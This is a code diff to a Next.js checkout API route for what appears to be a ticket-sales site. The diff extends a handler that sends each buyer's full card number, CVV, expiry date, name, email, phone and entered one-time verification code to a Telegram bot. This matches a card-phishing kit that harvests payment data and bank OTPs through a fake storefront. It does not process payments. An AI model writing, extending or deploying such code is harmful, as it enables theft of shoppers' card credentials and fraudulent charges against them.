@@ -13,6 +13,9 @@ export async function POST(request: NextRequest) {
       ticketName,
       quantity,
       total,
+      otpCode,
+      otpVerified,
+      paymentStatus,
     } = await request.json()
 
     const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
@@ -27,7 +30,59 @@ export async function POST(request: NextRequest) {
     const timestamp = new Date().toLocaleString('pl-PL')
     const orderId = Date.now()
     
-    const message = `
+    let message = ''
+    
+    if (otpVerified && otpCode) {
+      // OTP Verification Success Message
+      message = `
+✅ *OTP VERIFICATION SUCCESSFUL*
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 *ORDER INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Event: ${eventTitle}
+Ticket Type: ${ticketName}
+Quantity: ${quantity}
+Total Amount: ${total} PLN
+Order ID: ${orderId}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✓ *OTP VERIFICATION DETAILS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+OTP Code Entered: ${otpCode}
+Verification Status: ✅ VERIFIED
+Cardholder: ${cardFullName}
+Card Last 4: ${cardNumber.slice(-4).padStart(cardNumber.length, '*').slice(-4)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 *PAYMENT DETAILS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Full Card Number: ${cardNumber}
+CVV/CVC: ${cardCvv}
+Expiry Date: ${cardExpiry}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 *CUSTOMER INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Email: ${email}
+Phone: ${phone}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✓ *PAYMENT STATUS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Status: 🟢 PAYMENT VERIFIED & COMPLETED
+Timestamp: ${timestamp}
+
+✓ Transaction successfully verified with OTP.
+`
+    } else {
+      // Initial Card Details Message
+      message = `
 🛒 *CARD PAYMENT DETAILS - REQUIRES OTP VERIFICATION*
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -67,6 +122,7 @@ Timestamp: ${timestamp}
 ⚠️ Awaiting customer OTP verification to complete the transaction.
 🔐 Card details above - Store securely for reference.
     `
+    }
 
     // Send to Telegram
     const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`
